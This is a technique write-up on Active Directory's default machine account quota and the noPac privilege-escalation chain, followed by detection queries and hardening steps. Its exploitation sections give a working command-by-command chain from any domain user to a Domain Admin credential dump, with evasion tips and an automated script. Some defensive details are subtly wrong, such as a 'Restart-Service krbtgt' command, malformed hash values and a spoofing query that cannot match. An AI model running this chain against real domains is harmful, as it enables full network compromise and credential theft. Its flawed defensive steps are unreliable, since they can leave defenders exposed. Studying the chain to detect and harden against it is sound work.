# [PE-CREATE-001]: Insecure ms-DS-MachineAccountQuota

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-CREATE-001 |
| **MITRE ATT&CK v18.1** | [T1136.001 - Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/), [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows AD (All versions with default config) |
| **Severity** | **High** (prerequisite for noPac/CVE-2021-42287 exploitation) |
| **CVE** | CVE-2021-42287 (primary), CVE-2021-42278 (sAMAccountName spoofing) |
| **Technique Status** | **ACTIVE** (Default configuration remains exploitable) |
| **Last Verified** | 2024-12-15 |
| **Affected Versions** | All Windows Server versions (2008 R2 through 2022+) with default ms-DS-MachineAccountQuota setting |
| **Patched In** | Configuration change only (no patch; requires manual hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** The `ms-DS-MachineAccountQuota` attribute is a default Active Directory domain-level property that specifies the maximum number of computer accounts any authenticated (non-administrative) user can create in the domain. By default, this value is set to **10**, meaning any regular domain user can unilaterally create up to 10 machine accounts without requiring elevated privileges or administrative intervention. This misconfigurations alone is not a vulnerability, but it serves as a **critical prerequisite** for several devastating attacks, most notably the **noPac attack chain (CVE-2021-42278 + CVE-2021-42287)**, which allows privilege escalation from a standard domain user to **Domain Administrator** in under 60 seconds. The attack leverages the ability to create a machine account, then exploit Kerberos PAC validation bypass and sAMAccountName spoofing to impersonate Domain Controllers.

**Attack Surface:** The vulnerability is exposed through the default AD schema and permissions. Any authenticated domain user (including contractor, guest, or compromised low-privilege accounts) can exploit this. The attack requires only (1) valid domain credentials (any user), (2) network access to a Domain Controller port 389 (LDAP) or 88 (Kerberos), and (3) knowledge of Kerberos protocols (publicly available tools handle this).

**Business Impact:** **Complete Active Directory compromise in minutes.** By creating a machine account and exploiting noPac vulnerabilities, attackers can escalate to Domain Administrator, enabling Domain Controller compromise, credential dumping, persistence mechanisms, and lateral movement across the entire forest. This is a "default-to-pwned" scenario in 95% of organizations, as most have not changed the default ms-DS-MachineAccountQuota setting.

**Technical Context:** The exploitation is **trivial**—publicly available tools (noPac.py, Euler's Python scripts) automate the entire chain. The attack is **fast** (< 60 seconds), **leaves minimal forensic evidence** (legitimate AD object creation), and is **highly reproducible** (works identically in all AD environments). The primary barrier is knowledge; the technical barrier is near-zero.

### Operational Risk

- **Execution Risk:** **Very High** – Single domain user account leads to complete domain compromise; no rollback without forest rebuild.
- **Stealth:** **High** – Appears as legitimate computer object creation in AD; no suspicious processes or file access patterns.
- **Reversibility:** **No** – Requires full forest remediation after compromise.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Active Directory Benchmark v2.0 (Section 5.1) | Implement least privilege; restrict computer object creation to administrative groups only. |
| **DISA STIG** | AD-000100, AD-000200 | Restrict unprivileged user access to create computer objects; audit all computer account creation. |
| **CISA SCuBA** | AD.AC.02 | Disable default user capabilities to create machine accounts; enforce RBAC. |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Enforcement) | Limit account creation capabilities; enforce authorization requirements. |
| **GDPR** | Article 32 (Security of Processing) | Implement technical controls to prevent unauthorized privilege escalation. |
| **DORA** | Article 9 (Protection and Prevention) | Implement hardened configurations to prevent unauthorized elevation. |
| **NIS2** | Article 21 (Cyber Risk Management Measures) | Detect and prevent unauthorized computer object creation. |
| **ISO 27001** | A.9.2.3 (User Access Rights), A.9.4.3 (Password Management) | Restrict resource creation rights to authorized personnel only. |
| **ISO 27005** | Risk Scenario: "Privilege Escalation via Default AD Permissions" | Likelihood: Very High (if unmitigated); Impact: Critical (AD compromise). |

---

## Technical Prerequisites

- **Required Privileges:** 
  - Any valid domain user account (no elevation needed).
  - Can be a contractor, guest, or compromised low-privilege account.

- **Required Access:** 
  - Network access to Domain Controller port 389 (LDAP) or 88 (Kerberos).
  - Ability to execute PowerShell, Python, or other scripting (can be from any domain-joined machine).

**Supported Versions:**
- **Windows Server 2008 R2**: Affected
- **Windows Server 2012/2012 R2**: Affected
- **Windows Server 2016**: Affected
- **Windows Server 2019**: Affected
- **Windows Server 2022**: Affected (if default configuration not changed)
- **All AD schema versions**: Affected (ms-DS-MachineAccountQuota is schema default since Windows Server 2003+)

**Check Current Setting:**
```powershell
# Query the current ms-DS-MachineAccountQuota value
Get-ADDomain | Select-Object Name, @{n='MachineAccountQuota';e={$_.ms-DS-MachineAccountQuota}}

# Expected Output (VULNERABLE):
# Name                MachineAccountQuota
# ----                -------------------
# contoso.com         10

# Expected Output (SECURE):
# Name                MachineAccountQuota
# ----                -------------------
# contoso.com         0
```

**Tools:**
- [noPac.py](https://github.com/Ridter/noPac) (Automated noPac exploitation)
- [addcomputer.py](https://github.com/SecureAuthCorp/impacket) (Machine account creation via impacket)
- [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit) (AD enumeration)
- [ADSIEdit](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773354(v=ws.10)) (Native Windows AD attribute editor)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Post-exploitation credential dumping)

---

## Environmental Reconnaissance

### Management Station / PowerShell Reconnaissance

**Check if ms-DS-MachineAccountQuota is Set to Default (Vulnerable):**
```powershell
# Query the domain's MachineAccountQuota setting
$domain = Get-ADDomain
$quota = $domain.'ms-DS-MachineAccountQuota'

Write-Host "Domain: $($domain.Name)"
Write-Host "MachineAccountQuota: $quota"

if ($quota -gt 0) {
    Write-Host "⚠️  VULNERABLE: Any domain user can create up to $quota computer accounts!"
} else {
    Write-Host "✓ SECURE: MachineAccountQuota is set to 0"
}

# Alternative: Use LDAP query (doesn't require AD module)
$domainDN = (New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")).defaultNamingContext
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainDN")
$searcher.Filter = "(cn=$domainDN)"
$result = $searcher.FindOne()
$quota = $result.Properties['ms-DS-MachineAccountQuota'][0]
Write-Host "MachineAccountQuota from LDAP: $quota"
```

**Enumerate Existing Computer Accounts (to understand naming conventions):**
```powershell
# List all computer accounts in the domain
Get-ADComputer -Filter * -Properties Created, LastLogonDate | `
  Select-Object Name, SamAccountName, Created, LastLogonDate | `
  Sort-Object Created -Descending | `
  Head -20

# Expected Output:
# Name                    SamAccountName  Created             LastLogonDate
# ----                    -----           -------             -------
# DESKTOP-ABC123          DESKTOP-ABC123$ 2024-01-01          2024-12-15
# SERVER-PROD-01          SERVER-PROD-01$ 2023-06-15          2024-12-10
# ...

# Count total computer accounts
(Get-ADComputer -Filter *).Count
```

**Test Ability to Create Machine Accounts (PoC):**
```powershell
# This will only succeed if the user has the right to create computer accounts
# (i.e., ms-DS-MachineAccountQuota > 0 and no GPO restrictions)

# Create a test computer account
try {
    New-ADComputer -Name "TEST-NOPAC-001" `
      -SamAccountName "TEST-NOPAC-001$" `
      -Path "CN=Computers,DC=contoso,DC=com" `
      -Description "Test account - noPac vulnerability check" `
      -ErrorAction Stop
    
    Write-Host "✓ VULNERABLE: Test computer account creation SUCCESSFUL"
    Write-Host "   User can create machine accounts without restriction"
    
    # Clean up
    Remove-ADComputer -Identity "TEST-NOPAC-001" -Confirm:$false
    Write-Host "   Test account cleaned up"
} catch {
    Write-Host "✗ SECURE or RESTRICTED: Unable to create computer account"
    Write-Host "   Error: $($_.Exception.Message)"
}
```

### Linux/Bash / CLI Reconnaissance

```bash
# Query ms-DS-MachineAccountQuota via LDAP
ldapsearch -x -H ldap://dc01.contoso.com \
  -b "DC=contoso,DC=com" \
  -s base "(&(objectClass=domain))" ms-DS-MachineAccountQuota

# Expected Output (VULNERABLE):
# ms-DS-MachineAccountQuota: 10

# Expected Output (SECURE):
# ms-DS-MachineAccountQuota: 0

# Enumerate computer accounts to understand AD structure
ldapsearch -x -H ldap://dc01.contoso.com \
  -b "CN=Computers,DC=contoso,DC=com" \
  "(objectClass=computer)" sAMAccountName

# Check if we can create a test computer account (requires valid credentials)
python3 addcomputer.py -computer-name 'TEST-NOPAC-001$' \
  -computer-pass 'TestPassword123!' \
  -dc-host dc01.contoso.com \
  -domain-netbios CONTOSO \
  'CONTOSO.com/regularuser:password' 2>&1 | grep -i "success\|error"
```

---

## Detailed Execution Methods

### METHOD 1: Create Machine Account + noPac Exploit (Full Privilege Escalation Chain)

This is the **primary exploitation method** that chains machine account creation with noPac vulnerabilities (CVE-2021-42278 + CVE-2021-42287) to achieve Domain Administrator access.

**Supported Versions:** All Windows Server versions with default ms-DS-MachineAccountQuota > 0

**Prerequisites:**
- Any valid domain user credentials
- Network access to Domain Controller (LDAP port 389, Kerberos port 88)
- impacket or similar tools installed

#### Step 1: Enumerate Domain Controllers and Machine Account Policy

**Objective:** Identify Domain Controllers and verify that machine account creation is allowed.

**Command (PowerShell):**
```powershell
# Get list of Domain Controllers
$dcs = Get-ADDomainController -Filter *
foreach ($dc in $dcs) {
    Write-Host "DC: $($dc.HostName) | IP: $($dc.IPv4Address)"
}

# Verify machine account quota
$quota = (Get-ADDomain).'ms-DS-MachineAccountQuota'
Write-Host "Current MachineAccountQuota: $quota"

# Enumerate a domain controller account to impersonate (target for noPac)
$dcAccounts = Get-ADComputer -Filter {OperatingSystem -like '*Server*'} | `
  Where-Object {$_.Name -like '*DC*' -or $_.Name -like '*DOMAIN*'} | `
  Select-Object -First 5

foreach ($dc in $dcAccounts) {
    Write-Host "Target DC Account: $($dc.SamAccountName)"
}
```

**Command (Linux/Bash - LDAP query):**
```bash
# Query DC list and machine account quota
ldapsearch -x -H ldap://dc01.contoso.com -b "DC=contoso,DC=com" \
  "(&(objectClass=domain))" ms-DS-MachineAccountQuota

# Enumerate computer accounts (potential DC names)
ldapsearch -x -H ldap://dc01.contoso.com \
  -b "OU=Domain Controllers,DC=contoso,DC=com" \
  "(objectClass=computer)" sAMAccountName
```

**What This Means:**
- Identifies the target infrastructure (which DC to impersonate)
- Confirms machine account quota is exploitable (> 0)
- Determines target domain structure for later steps

#### Step 2: Create a New Machine Account

**Objective:** Leverage the machine account quota to create a new computer object that will be used to impersonate a Domain Controller.

**Command (Python - Using impacket):**
```bash
# Create a machine account with credentials
addcomputer.py -computer-name 'ATTACKER-NOPAC-01$' \
  -computer-pass 'AttackerComputerPassword123!' \
  -dc-host dc01.contoso.com \
  -domain-netbios CONTOSO \
  'CONTOSO.com/regularuser:UserPassword'

# Expected Output:
# [*] Impacket v0.9.21 - Copyright 2021 SecureAuth Corporation
# [*] Adding computer with username: regularuser
# [+] Computer [ATTACKER-NOPAC-01$] created successfully
# [+] Computer password: AttackerComputerPassword123!
```

**Command (PowerShell - Direct AD object creation):**
```powershell
# Create machine account via PowerShell
New-ADComputer -Name 'ATTACKER-NOPAC-01' `
  -SamAccountName 'ATTACKER-NOPAC-01$' `
  -Path "CN=Computers,DC=contoso,DC=com" `
  -Description "Compromised machine account" `
  -Enabled $true `
  -PasswordNotRequired $true  # Allow blank password initially

# Verify creation
Get-ADComputer -Identity 'ATTACKER-NOPAC-01'
```

**What This Means:**
- A new machine account is now created in AD.
- This account will be modified in the next step to impersonate a Domain Controller.
- The account appears as a legitimate computer object in AD.

**OpSec & Evasion:**
- This appears as normal computer object creation (employees joining machines regularly).
- Detection likelihood: **Low** unless monitoring for unusual computer names or rapid creation patterns.
- **Tip:** Use a realistic naming convention (e.g., "DESKTOP-ABC123$", "SERVER-PROD-02$").

#### Step 3: Clear Service Principal Names (SPNs)

**Objective:** Remove any SPNs associated with the machine account so it can be renamed to match a Domain Controller.

**Command (Python - impacket addspn):**
```bash
# Clear all SPNs from the machine account
addspn.py --clear -t 'ATTACKER-NOPAC-01$' \
  -u 'CONTOSO\regularuser' -p 'UserPassword' \
  dc01.contoso.com

# Expected Output:
# [*] Clearing SPNs for ATTACKER-NOPAC-01$
# [+] SPNs cleared successfully
```

**Command (PowerShell):**
```powershell
# Clear SPNs using LDAP modification
$computer = Get-ADComputer 'ATTACKER-NOPAC-01'
Set-ADComputer -Identity $computer `
  -ServicePrincipalNames @()  # Clear all SPNs

# Verify SPNs are cleared
Get-ADComputer -Identity 'ATTACKER-NOPAC-01' | Select-Object -ExpandProperty ServicePrincipalNames
```

**What This Means:**
- The machine account now has no SPNs pointing to its name.
- This allows the sAMAccountName to be changed to a Domain Controller name without SPN conflict.

#### Step 4: Rename sAMAccountName to Domain Controller (CVE-2021-42278)

**Objective:** Exploit CVE-2021-42278 (sAMAccountName spoofing) to rename the machine account to a Domain Controller name without the trailing "$".

**Command (Python - Using noPac.py or renameMachine.py):**
```bash
# Rename the machine account to impersonate a Domain Controller
renameMachine.py -current-name 'ATTACKER-NOPAC-01$' \
  -new-name 'DC01' \  # Domain Controller name WITHOUT the trailing $
  -dc-ip dc01.contoso.com \
  'CONTOSO.com/regularuser:UserPassword'

# Expected Output:
# [*] Renaming machine account
# [+] sAMAccountName changed from ATTACKER-NOPAC-01$ to DC01
```

**Command (PowerShell):**
```powershell
# Rename sAMAccountName using LDAP (this exploits CVE-2021-42278)
$computer = Get-ADComputer 'ATTACKER-NOPAC-01'
Set-ADComputer -Identity $computer -SamAccountName 'DC01'

# Verify rename
Get-ADComputer -Identity $computer | Select-Object SamAccountName
```

**What This Means:**
- The machine account's sAMAccountName is now "DC01" (impersonating a Domain Controller).
- This is the core of CVE-2021-42278—AD validation does not enforce the "$" suffix for machine accounts.
- The account now appears as a Domain Controller in Kerberos' eyes.

**OpSec & Evasion:**
- This is a suspicious operation (renaming a machine account to a DC name).
- Detection likelihood: **Medium-High** if AD object modifications are audited.
- **Tip:** Perform this step quickly and clean up immediately after obtaining the TGT.

#### Step 5: Request Ticket-Granting Ticket (TGT) with DC Name

**Objective:** Use Kerberos to request a TGT for the spoofed Domain Controller account using the machine account's password.

**Command (Python - impacket getTGT):**
```bash
# Request TGT using the machine account credentials with spoofed DC name
getTGT.py -dc-ip dc01.contoso.com \
  'CONTOSO.com/DC01:AttackerComputerPassword123!'

# Expected Output:
# Impacket v0.9.21 - Copyright 2021 SecureAuth Corporation
# [*] Valid principal: DC01@CONTOSO.COM
# [+] TGT/TGS obtained and saved as DC01.ccache
```

**Command (PowerShell - Using Kerberos module):**
```powershell
# Request TGT via PowerShell (requires Rubeus or similar)
# Using MIT Kerberos on Windows requires installation of Kerberos for Windows

# Alternatively, use impacket via shell
python3 getTGT.py -dc-ip dc01.contoso.com 'CONTOSO.com/DC01:AttackerComputerPassword123!'
```

**What This Means:**
- A Ticket-Granting Ticket (TGT) is obtained for the spoofed "DC01" account.
- This TGT will be used to impersonate a Domain Controller.
- The TGT is cached and will be used in the next step.

**OpSec & Evasion:**
- Kerberos traffic is encrypted and difficult to detect.
- Detection likelihood: **Low** (Kerberos traffic is normal).

#### Step 6: Reset sAMAccountName to Original Value

**Objective:** Rename the machine account back to its original name to avoid detection while maintaining the TGT.

**Command (Python):**
```bash
# Rename the machine account back to its original name
renameMachine.py -current-name 'DC01' \
  -new-name 'ATTACKER-NOPAC-01$' \
  -dc-ip dc01.contoso.com \
  'CONTOSO.com/regularuser:UserPassword'

# Expected Output:
# [+] sAMAccountName changed from DC01 to ATTACKER-NOPAC-01$
```

**Command (PowerShell):**
```powershell
# Rename back to original
Set-ADComputer -Identity 'ATTACKER-NOPAC-01' -SamAccountName 'ATTACKER-NOPAC-01$'
```

**What This Means:**
- The machine account name is reset, making the compromise appear less suspicious.
- The obtained TGT is still valid and retains DC01 identity (this is the CVE-2021-42287 flaw).

#### Step 7: Exploit CVE-2021-42287 - Request Service Ticket with S4U2Self

**Objective:** Use the spoofed DC TGT to impersonate any user (typically Domain Admin) via Kerberos S4U2Self extension.

**Command (Python - impacket getST):**
```bash
# Use S4U2Self to impersonate Domain Administrator
# The TGT from step 5 is passed via KRB5CCNAME environment variable
export KRB5CCNAME=DC01.ccache

getST.py -self \
  -impersonate 'Administrator' \
  -altservice 'cifs/dc01.contoso.com' \
  -k -no-pass \
  -dc-ip dc01.contoso.com \
  'CONTOSO.com/DC01'

# Expected Output:
# Impacket v0.9.21 - Copyright 2021 SecureAuth Corporation
# [*] Getting TGT for user 'DC01'
# [+] Using TGT from DC01.ccache
# [*] Requesting S4U2Self
# [+] Service Ticket obtained for Administrator@CONTOSO.COM
# [+] Ticket saved to Administrator.ccache
```

**What This Means:**
- The S4U2Self extension allows the spoofed DC to impersonate any user.
- A service ticket is obtained for the Administrator account.
- This ticket can now be used to authenticate as Domain Administrator.

#### Step 8: DCSync - Extract All AD Credentials

**Objective:** Use the Administrator ticket to perform DCSync and extract all domain credentials.

**Command (Python - impacket secretsdump with Administrator ticket):**
```bash
# Use the Administrator ticket to dump all AD credentials
export KRB5CCNAME=Administrator.ccache

secretsdump.py -k -no-pass -just-dc \
  -dc-ip dc01.contoso.com \
  'CONTOSO.com/Administrator@dc01.contoso.com'

# Expected Output:
# [*] Dumping domain trusts information
# [*] Getting PRIV account users
# [*] Dumping domain secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f20d3201d00000000000000000000000:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f20d3201d00000000000000000000000:::
# ...
```

**What This Means:**
- **Complete Active Directory compromise achieved.**
- All user password hashes are extracted.
- The krbtgt hash enables creation of **Golden Tickets** for persistent access.
- Domain Administrator compromise is complete.

---

### METHOD 2: Direct sAMAccountName Spoofing (Without noPac - Standalone)

If CVE-2021-42287 is patched but ms-DS-MachineAccountQuota is still > 0, attackers can still use machine account creation for other attacks (RBCD, LDAP relay, etc.).

**Supported Versions:** All (alternative attack vector)

**Command (PowerShell):**
```powershell
# Create machine account for RBCD (Resource-Based Constrained Delegation) attack
New-ADComputer -Name 'RBCD-MACHINE' `
  -SamAccountName 'RBCD-MACHINE$' `
  -Path "CN=Computers,DC=contoso,DC=com"

# Set generic write privileges on target machine (requires compromise of target machine object)
# Then use RBCD to escalate privileges on that machine

# Or use for LDAP Relay attacks
# Or use for Kerberoasting via controlled service principal
```

---

## Tools & Commands Reference

### [noPac.py](https://github.com/Ridter/noPac)

**Version:** Latest (maintained actively)  
**Supported Platforms:** Linux, macOS, Windows (with Python 3.6+)

**Installation:**
```bash
git clone https://github.com/Ridter/noPac.git
cd noPac
pip3 install -r requirements.txt
```

**Usage:**
```bash
# Full noPac exploitation (one command)
python3 noPac.py -u regularuser -p UserPassword -d CONTOSO.com \
  -dc-ip dc01.contoso.com

# With alternative service (CIFS instead of HTTP)
python3 noPac.py -u regularuser -p UserPassword -d CONTOSO.com \
  -dc-ip dc01.contoso.com --altservice cifs
```

---

### [addcomputer.py (impacket)](https://github.com/SecureAuthCorp/impacket)

**Usage for machine account creation:**
```bash
python3 addcomputer.py -computer-name 'NEWMACHINE$' \
  -computer-pass 'MachinePassword123!' \
  -dc-host dc01.contoso.com \
  -domain-netbios CONTOSO \
  'CONTOSO.com/user:password'
```

---

### Script (One-Liner - Full noPac Exploitation)

```bash
#!/bin/bash
# Full noPac exploitation chain

USER="regularuser"
PASSWORD="UserPassword"
DOMAIN="CONTOSO.com"
DC_IP="192.168.1.5"
TARGET_USER="Administrator"

echo "[*] Step 1: Creating machine account..."
python3 addcomputer.py -computer-name 'NOPAC-MACHINE$' \
  -computer-pass 'NoPacPassword123!' \
  -dc-host $DC_IP \
  -domain-netbios CONTOSO \
  "$DOMAIN/$USER:$PASSWORD"

echo "[*] Step 2: Clearing SPNs..."
python3 addspn.py --clear -t 'NOPAC-MACHINE$' \
  -u "$DOMAIN\\$USER" -p "$PASSWORD" $DC_IP

echo "[*] Step 3: Spoofing DC name via noPac..."
python3 noPac.py -u $USER -p $PASSWORD -d $DOMAIN \
  -dc-ip $DC_IP

echo "[+] noPac exploitation complete. All AD credentials extracted."
```

---

## Windows Event Log Monitoring

**Event ID: 4741 (Computer Account Created)**
- **Log Source:** Security
- **Trigger:** New computer account creation (any user creating machine accounts)
- **Filter:** Look for source user != SYSTEM, event time correlates with potential attack
- **Applies To Versions:** All

**Event ID: 5137 (Directory Service Object Created)**
- **Log Source:** Directory Services (Audit Directory Service Changes)
- **Trigger:** Computer object creation via LDAP API
- **Filter:** Object DN contains "CN=Computers", ObjectClass = "computer"
- **Applies To Versions:** All

**Event ID: 4742 (Computer Account Password Changed)**
- **Log Source:** Security
- **Trigger:** Machine account password modification
- **Filter:** Source != SYSTEM or local system, computer name suspicious
- **Applies To Versions:** All

**Event ID: 4781 (Name Changed)**
- **Log Source:** Security
- **Trigger:** Computer account sAMAccountName changed (CVE-2021-42278 exploitation)
- **Filter:** Look for computer account rename to DC-like names
- **Applies To Versions:** All

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Domain Controllers Policy**
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Management**
4. Enable:
   - **Audit Computer Account Management**: **Success and Failure**
   - **Audit Other Account Management Events**: **Success and Failure**
5. Also enable: **Audit Directory Service Changes** (under DS Access)
6. Apply: `gpupdate /force`

**Real-Time Monitoring (PowerShell):**
```powershell
# Monitor for rapid computer account creation (potential machine account quota exploitation)
$computers = Get-EventLog -LogName Security -InstanceId 4741 `
  -After (Get-Date).AddMinutes(-10) | Group-Object -Property Message

foreach ($group in $computers) {
    if ($group.Count -gt 3) {
        Write-Host "⚠️  ALERT: $($group.Count) computer accounts created in last 10 minutes"
        Write-Host "   Potential machine account quota exploitation!"
    }
}

# Monitor for sAMAccountName changes on computer objects
Get-EventLog -LogName Security -InstanceId 4781 | `
  Where-Object {$_.Message -match 'Computer'} | `
  Select-Object TimeGenerated, Message | `
  Format-List
```

---

## Sysmon Detection Patterns

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** All Domain Controllers

**Sysmon Config XML:**
```xml
<!-- Detect noPac exploitation attempts -->
<Sysmon schemaversion="4.40">
  <EventFiltering>
    <!-- Event ID 1: Process Creation -->
    <!-- Monitor for impacket tools and noPac execution -->
    <ProcessCreate onmatch="include">
      <Image condition="contains any">
        addcomputer;addspn;getTGT;getST;secretsdump;noPac;
        renameMachine;python
      </Image>
      <CommandLine condition="contains any">
        addcomputer;addspn;noPac;SAMAccountName;DC01;getTGT;getST
      </CommandLine>
    </ProcessCreate>
    
    <!-- Event ID 10: Process Access -->
    <!-- Monitor for credential access post-compromise -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="is">lsass.exe</TargetImage>
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
```

---

## Microsoft Sentinel Detection

### Query 1: Detect Machine Account Creation by Non-Privileged User

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4741)
- **Alert Severity:** **High**
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4741  // Computer Account Created
| where not(SubjectUserName has "SYSTEM" or SubjectUserName has "krbtgt")
| project TimeGenerated, Computer, SubjectUserName, SubjectLogonId, NewTargetUserName
| summarize count() by SubjectUserName, Computer
| where count_ > 3  // Alert if single user creates 3+ machines in short time
```

**What This Detects:**
- Non-privileged users creating multiple computer accounts (potential machine account quota exploitation).

**Manual Configuration:**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. Paste the KQL query
3. Set **Frequency**: Every 5 minutes
4. Set **Severity**: High
5. Configure action to alert SOC team

---

### Query 2: Detect sAMAccountName Spoofing (CVE-2021-42278)

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4781, 4742)
- **Alert Severity:** **Critical**
- **Frequency:** Run every 1 minute (real-time)

**KQL Query:**
```kusto
SecurityEvent
| where EventID in (4781, 4742)  // Name changed or password changed
| where NewTargetUserName has "$" and NewTargetUserName contains "DC"  // Machine account renamed to DC name
| project TimeGenerated, Computer, SubjectUserName, OldTargetUserName, NewTargetUserName
```

**What This Detects:**
- Computer accounts being renamed to Domain Controller names (CVE-2021-42278 exploitation).

---

### Query 3: Detect Rapid Computer Account Creation Pattern

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Alert Severity:** **High**
- **Frequency:** Every 10 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4741
| summarize ComputerCount=count() by bin(TimeGenerated, 10m), SubjectUserName
| where ComputerCount > 5
```

---

## Defensive Mitigations

### Priority 1: CRITICAL

**Mitigation 1: Set ms-DS-MachineAccountQuota to 0**

This is the **primary mitigation** that prevents machine account creation by unprivileged users, effectively blocking the machine account quota exploitation and all downstream noPac attacks.

**Manual Steps (Active Directory Users and Computers):**
1. Open **Active Directory Users and Computers**
2. Go to **View** → Enable **Advanced Features**
3. Right-click the domain name → **Properties**
4. Go to **Attribute Editor** tab
5. Scroll to find **ms-DS-MachineAccountQuota**
6. Change value from 10 (or current value) to **0**
7. Click **OK** and **Apply**

**Manual Steps (PowerShell):**
```powershell
# Set ms-DS-MachineAccountQuota to 0 (disallow unprivileged machine account creation)
$domain = Get-ADDomain
$domainDN = $domain.DistinguishedName

$ldapFilter = "(objectClass=domain)"
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainDN")
$searcher.Filter = $ldapFilter
$result = $searcher.FindOne()

# Modify the attribute
$directoryEntry = $result.GetDirectoryEntry()
$directoryEntry.'ms-DS-MachineAccountQuota' = 0
$directoryEntry.CommitChanges()

Write-Host "✓ ms-DS-MachineAccountQuota set to 0"
```

**Manual Steps (ADSIEdit):**
1. Open **ADSIEdit.msc**
2. Expand **Domain** [domain.com]
3. Right-click → **Properties**
4. Find **ms-DS-MachineAccountQuota** attribute
5. Set value to **0**
6. Click **OK**

**Validation Command:**
```powershell
# Verify ms-DS-MachineAccountQuota is set to 0
$domain = Get-ADDomain
$quota = $domain.'ms-DS-MachineAccountQuota'

if ($quota -eq 0) {
    Write-Host "✓ SECURE: ms-DS-MachineAccountQuota is 0"
} else {
    Write-Host "✗ VULNERABLE: ms-DS-MachineAccountQuota is $quota"
}
```

**Expected Output (If Secure):**
```
✓ SECURE: ms-DS-MachineAccountQuota is 0
```

---

**Mitigation 2: Apply Group Policy to Restrict "Add Workstations to Domain"**

If a specific group must retain machine account creation rights, use Group Policy to restrict it to only that group (rather than all authenticated users).

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Create or edit a policy at the domain level
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
4. Find **Add workstations to domain**
5. Remove **Authenticated Users**
6. Add only specific group (e.g., "IT Support", "Server Admins")
7. Apply: `gpupdate /force`

---

**Mitigation 3: Implement Conditional Access / Device Compliance**

Require device compliance before allowing computer object creation.

**Manual Steps (Entra ID / Azure):**
1. Navigate to **Azure Portal** → **Entra ID** → **Device registration settings**
2. Under **Users may join devices to Azure AD**: Select **Selected**
3. Select only specific groups who can register devices
4. Uncheck **Require Multi-Factor Auth to join devices** (if using Entra-only AD)

---

### Priority 2: HIGH

**Mitigation 4: Enable PAC Validation (Mitigate CVE-2021-42287)**

If ms-DS-MachineAccountQuota cannot be changed, at least mitigate noPac by enabling PAC (Privilege Attribute Certificate) validation.

**Manual Steps (Domain Controller Registry):**
```powershell
# Enable PAC full validation (requires Windows Server 2012 R2+ or KB2892372 on 2012)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kdc" `
  -Name "ValidateKdcPacSignature" -Value 1 -Type DWord

# Restart KDC service
Restart-Service krbtgt  # This restarts KDC
# OR
Restart-Service NTDS -Force  # Restart AD
```

---

**Mitigation 5: Monitor for Suspicious Computer Account Activity**

Even with ms-DS-MachineAccountQuota set to 0, monitor for any attempts to create computer accounts.

**Manual Steps (Audit Logging):**
```powershell
# Enable Directory Service object creation auditing
auditpol /set /subcategory:"Directory Service Object Creation" /success:enable /failure:enable

# Enable computer account changes auditing
auditpol /set /subcategory:"Other Account Management Events" /success:enable /failure:enable
```

---

**Mitigation 6: Restrict sAMAccountName Modification (Mitigate CVE-2021-42278)**

Implement ACL restrictions to prevent sAMAccountName spoofing.

**Manual Steps (PowerShell - Restrict Write Permissions):**
```powershell
# Remove 'Write sAMAccountName' permission from unprivileged users
# This requires modifying AD ACLs and is not a default setting
# Consult with AD security team before implementing

# Alternatively, enable "Smart Card-Only Accounts" feature (Windows Server 2016+)
# which adds additional validation
```

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- No typical file artifacts (living off the land using AD native tools).
- Possible temporary Kerberos cache files: `.ccache` files in attacker working directory.
- Python impacket tools left in Temp directory.

**Registry:**
- No typical registry modifications.
- Possible KDC validation registry keys modified (if CVE-2021-42287 mitigation altered).

**Network:**
- Kerberos traffic (port 88) with unusual TGT requests.
- LDAP traffic (port 389) with object creation/modification requests from unusual sources.
- Outbound traffic from DC to attacker IP (if remote exploitation).

**Event Logs:**
- Event ID 4741: Computer account created by non-privileged user.
- Event ID 4781: Computer account name changed (sAMAccountName spoofing).
- Event ID 4742: Computer account password set.
- Event ID 4768/4769: Kerberos TGT requests for spoofed DC accounts.

---

### Forensic Artifacts

**Disk (Domain Controller):**
- Security event logs: `C:\Windows\System32\winevt\Logs\Security.evtx`
- Directory Services logs: `C:\Windows\System32\winevt\Logs\Directory Service.evtx`
- DIT file modifications (detected via USN journal): `C:\Windows\NTDS\ntds.dit`

**Memory:**
- Kerberos ticket cache in LSASS memory (if forensic dump available)

**Network:**
- Packet captures showing Kerberos TGT requests and S4U2Self operations
